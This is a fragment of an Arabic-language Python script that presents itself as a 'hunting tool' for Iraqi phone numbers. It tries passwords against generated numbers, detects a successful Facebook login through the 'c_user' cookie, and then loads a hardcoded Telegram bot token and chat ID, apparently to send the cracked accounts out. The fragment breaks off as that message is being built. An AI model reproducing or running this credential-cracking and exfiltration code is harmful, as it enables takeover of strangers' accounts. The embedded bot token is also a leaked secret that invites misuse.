...
g= datetime.datetime(2023, 5, 4, 12, 10 ,9)
...
def i():
    ...
    jalan("\033[1;37m\t اداه صيد دوله العراق")
    jalan('\033[1;36m     \t  المطور نادر @NN11N11\n     \033[1;32m964780, \033[1;36m964770 ,\033[1;35m964751 ,\033[1;34m964750\033[0;97m')

    code = input(' اختار رقم واكتبه : ')
    os.system("clear")
    print("\033[1;34m اختار رقم الفحص \n\033[1;31m10000\n\033[1;32m20000\n\033[1;33m30000\n\033[1;35m40000\n\033[1;36m50000")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                token = '6141080736:AAHs1SJEx3d2Q61YSS3bzs-L8Dfn5hC1-uA'
                ID = '5868677803'
                tlg = (f'''
